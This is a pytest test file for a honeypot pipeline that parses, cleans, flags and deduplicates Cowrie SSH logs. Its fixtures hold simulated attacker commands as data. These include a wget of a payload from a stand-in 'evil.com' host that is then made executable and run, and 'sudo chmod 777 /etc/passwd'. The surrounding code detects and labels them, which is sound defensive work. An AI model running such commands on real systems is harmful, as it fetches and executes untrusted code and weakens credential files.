import pytest
import json
import tempfile
from datetime import datetime
from pathlib import Path

from pipeline.parser import CowrieLogParser
from pipeline.cleanser import LogCleanser
from pipeline.deduplicator import SessionDeduplicator
from pipeline.main import HoneypotPipeline


class TestCowrieLogParser:
    """Tests for CowrieLogParser."""

    @pytest.fixture
    def sample_log_file(self):
        """Create a temporary sample log file."""
        logs = [
            {"eventid": "cowrie.command.input", "timestamp": "2025-01-15T08:23:17.123456Z", "session": "sess1", "src_ip": "192.168.1.1", "input": "wget http://evil.com/payload.sh", "duration": 0.45},
            {"eventid": "cowrie.command.input", "timestamp": "2025-01-15T08:23:18.123456Z", "session": "sess1", "src_ip": "192.168.1.1", "input": "chmod +x payload.sh", "duration": 0.12},
            {"eventid": "cowrie.command.input", "timestamp": "2025-01-15T08:23:19.123456Z", "session": "sess1", "src_ip": "192.168.1.1", "input": "./payload.sh", "duration": 2.34},
            {"eventid": "cowrie.command.input", "timestamp": "2025-01-15T09:00:00.000000Z", "session": "sess2", "src_ip": "10.0.0.1", "input": "ls", "duration": 0.01},
            {"eventid": "cowrie.login.failed", "timestamp": "2025-01-15T09:01:00.000000Z", "session": "sess3", "src_ip": "10.0.0.2", "input": "", "duration": 0.0},
        ]

        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            for log in logs:
                f.write(json.dumps(log) + '\n')
            return f.name

    def test_parse_file(self, sample_log_file):
        parser = CowrieLogParser()
        events = list(parser.parse_file(sample_log_file))

        assert len(events) == 4  # login.failed filtered out by default
        assert events[0]["session"] == "sess1"
        assert events[0]["input"] == "wget http://evil.com/payload.sh"
        assert isinstance(events[0]["timestamp"], datetime)

    def test_parse_file_not_found(self):
        parser = CowrieLogParser()
        with pytest.raises(FileNotFoundError):
            list(parser.parse_file("nonexistent.json"))

    def test_parse_directory(self, sample_log_file):
        parser = CowrieLogParser()
        dir_path = Path(sample_log_file).parent
        events = list(parser.parse_directory(str(dir_path), pattern="*.json"))

        assert len(events) >= 4

    def test_stats(self, sample_log_file):
        parser = CowrieLogParser()
        list(parser.parse_file(sample_log_file))
        stats = parser.get_stats()

        assert stats["parsed"] == 4
        assert stats["errors"] == 0
        assert stats["success_rate"] == 1.0

    def test_invalid_json(self):
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            f.write("not valid json\n")
            f.write(json.dumps({"eventid": "cowrie.command.input", "timestamp": "2025-01-15T00:00:00Z", "session": "s1", "src_ip": "1.1.1.1", "input": "test"}) + "\n")
            temp_path = f.name

        parser = CowrieLogParser()
        events = list(parser.parse_file(temp_path))

        assert len(events) == 1
        assert parser.get_stats()["errors"] == 1


class TestLogCleanser:
    """Tests for LogCleanser."""

    @pytest.fixture
    def cleanser(self):
        return LogCleanser(noise_filter=True, normalize_commands=True, flag_suspicious=True)

    def test_cleanse_valid_event(self, cleanser):
        event = {"eventid": "cowrie.command.input", "input": "wget http://evil.com/payload.sh"}
        result = cleanser.cleanse_event(event)

        assert result is not None
        assert result["input"] == "wget http://evil.com/payload.sh"
        assert "suspicious_flags" in result
        assert "download" in result["suspicious_flags"]

    def test_cleanse_noise_filter(self, cleanser):
        event = {"eventid": "cowrie.command.input", "input": "ls"}
        result = cleanser.cleanse_event(event)

        assert result is None
        assert cleanser.noise_count == 1

    def test_cleanse_normalize(self, cleanser):
        event = {"eventid": "cowrie.command.input", "input": "  WGET   http://evil.com/payload.sh  "}
        result = cleanser.cleanse_event(event)

        assert result["input"] == "wget http://evil.com/payload.sh"
        assert result["input_original"] == "  WGET   http://evil.com/payload.sh  "

    def test_cleanse_suspicious_flags(self, cleanser):
        event = {"eventid": "cowrie.command.input", "input": "sudo chmod 777 /etc/passwd"}
        result = cleanser.cleanse_event(event)

        assert "privilege_escalation" in result["suspicious_flags"]
        assert "persistence" in result["suspicious_flags"]

    def test_cleanse_empty_input(self, cleanser):
        event = {"eventid": "cowrie.command.input", "input": ""}
        result = cleanser.cleanse_event(event)

        assert result is None

    def test_cleanse_events_batch(self, cleanser):
        events = [
            {"eventid": "cowrie.command.input", "input": "ls"},
            {"eventid": "cowrie.command.input", "input": "wget http://evil.com"},
            {"eventid": "cowrie.command.input", "input": "pwd"},
        ]
        cleaned = cleanser.cleanse_events(events)

        assert len(cleaned) == 1
        assert cleaned[0]["input"] == "wget http://evil.com"

    def test_stats(self, cleanser):
        events = [
            {"eventid": "cowrie.command.input", "input": "ls"},
            {"eventid": "cowrie.command.input", "input": "wget http://evil.com"},
        ]
        cleanser.cleanse_events(events)
        stats = cleanser.get_stats()

        assert stats["cleaned"] == 1
        assert stats["noise_filtered"] == 1
        assert stats["total_processed"] == 2


class TestSessionDeduplicator:
    """Tests for SessionDeduplicator."""

    @pytest.fixture
    def sample_sessions(self):
        return [
            {"session_id": "s1", "src_ip": "192.168.1.1", "commands": ["wget", "chmod", "execute"], "start_time": "2025-01-01"},
            {"session_id": "s2", "src_ip": "192.168.1.2", "commands": ["wget", "chmod", "execute"], "start_time": "2025-01-02"},
            {"session_id": "s3", "src_ip": "192.168.1.3", "commands": ["ls", "pwd"], "start_time": "2025-01-03"},
        ]

    def test_deduplicate_exact(self, sample_sessions):
        dedup = SessionDeduplicator(strategy="exact")
        result = dedup.deduplicate_sessions(sample_sessions)

        assert len(result) == 2  # s1 and s2 are duplicates
        assert dedup.duplicate_count == 1
        assert dedup.unique_count == 2

    def test_deduplicate_fuzzy(self, sample_sessions):
        dedup = SessionDeduplicator(strategy="fuzzy")
        # s1 and s2 have same commands (same set), s3 is different
        result = dedup.deduplicate_sessions(sample_sessions)

        assert len(result) == 2

    def test_metadata_preservation(self, sample_sessions):
        dedup = SessionDeduplicator(strategy="exact", keep_metadata=True)
        result = dedup.deduplicate_sessions(sample_sessions)

        # Find the unique session that had duplicates
        for session in result:
            if session["session_id"] == "s1":
                assert "duplicate_metadata" in session
                assert "192.168.1.2" in session["duplicate_metadata"]["src_ips"]

    def test_stats(self, sample_sessions):
        dedup = SessionDeduplicator()
        dedup.deduplicate_sessions(sample_sessions)
        stats = dedup.get_stats()

        assert stats["unique_sessions"] == 2
        assert stats["duplicate_sessions"] == 1
        assert stats["deduplication_ratio"] == 1/3

    def test_reset(self, sample_sessions):
        dedup = SessionDeduplicator()
        dedup.deduplicate_sessions(sample_sessions)
        dedup.reset()

        assert dedup.unique_count == 0
        assert dedup.duplicate_count == 0
        assert len(dedup.seen_hashes) == 0


class TestHoneypotPipeline:
    """Integration tests for HoneypotPipeline."""

    @pytest.fixture
    def sample_data_dir(self):
        """Create temporary directory with sample logs."""
        with tempfile.TemporaryDirectory() as tmpdir:
            log_file = Path(tmpdir) / "cowrie.json"
            logs = [
                {"eventid": "cowrie.command.input", "timestamp": "2025-01-15T08:23:17.123456Z", "session": "sess1", "src_ip": "192.168.1.1", "input": "wget http://evil.com/payload.sh", "duration": 0.45},
                {"eventid": "cowrie.command.input", "timestamp": "2025-01-15T08:23:18.123456Z", "session": "sess1", "src_ip": "192.168.1.1", "input": "chmod +x payload.sh", "duration": 0.12},
                {"eventid": "cowrie.command.input", "timestamp": "2025-01-15T08:23:19.123456Z", "session": "sess1", "src_ip": "192.168.1.1", "input": "./payload.sh", "duration": 2.34},
                {"eventid": "cowrie.command.input", "timestamp": "2025-01-15T09:00:00.000000Z", "session": "sess2", "src_ip": "10.0.0.1", "input": "ls", "duration": 0.01},
                {"eventid": "cowrie.command.input", "timestamp": "2025-01-15T09:01:00.000000Z", "session": "sess2", "src_ip": "10.0.0.1", "input": "pwd", "duration": 0.01},
            ]
            with open(log_file, 'w') as f:
                for log in logs:
                    f.write(json.dumps(log) + '\n')
            yield str(tmpdir)

    def test_full_pipeline(self, sample_data_dir):
        pipeline = HoneypotPipeline(
            log_path=sample_data_dir,
            deduplicate=True,
            noise_filter=True
        )
        sessions = pipeline.run()

        assert len(sessions) >= 1
        assert all("commands" in s for s in sessions)
        assert all("command_count" in s for s in sessions)

    def test_pipeline_stats(self, sample_data_dir):
        pipeline = HoneypotPipeline(
            log_path=sample_data_dir,
            deduplicate=True,
            noise_filter=True
        )
        pipeline.run()
        stats = pipeline.get_stats()

        assert "parser" in stats
        assert "cleanser" in stats
        assert "deduplicator" in stats
        assert stats["parser"]["parsed"] > 0

    def test_save_sessions(self, sample_data_dir):
        with tempfile.TemporaryDirectory() as output_dir:
            pipeline = HoneypotPipeline(
                log_path=sample_data_dir,
                output_dir=output_dir
            )
            pipeline.run()
            pipeline.save_sessions("test_sessions.json")

            output_file = Path(output_dir) / "test_sessions.json"
            assert output_file.exists()

            with open(output_file) as f:
                data = json.load(f)
            assert len(data) > 0
